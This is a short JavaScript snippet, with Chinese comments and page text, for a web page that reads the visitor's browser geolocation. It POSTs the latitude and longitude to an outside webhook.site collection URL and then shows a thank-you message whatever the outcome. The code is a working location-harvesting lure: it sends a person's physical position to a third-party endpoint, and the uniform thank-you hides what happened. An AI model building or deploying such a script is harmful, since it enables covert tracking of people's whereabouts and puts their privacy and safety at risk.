function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendPosition, showError);
    } else {
        showThankYou();
    }
}

function sendPosition(position) {
    // 这里用fetch把数据POST到你的服务器（假设有接口）
    fetch('https://webhook.site/bad5c5ad-c5ab-4a6d-89a7-8360c04d9f75', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude
        })
    }).then(response => {
        showThankYou();
    }).catch(error => {
        showThankYou();
    });
}

function showError(error) {
    showThankYou();
}

function showThankYou() {
    document.body.innerHTML = "<h1>谢谢参与！</h1>";
}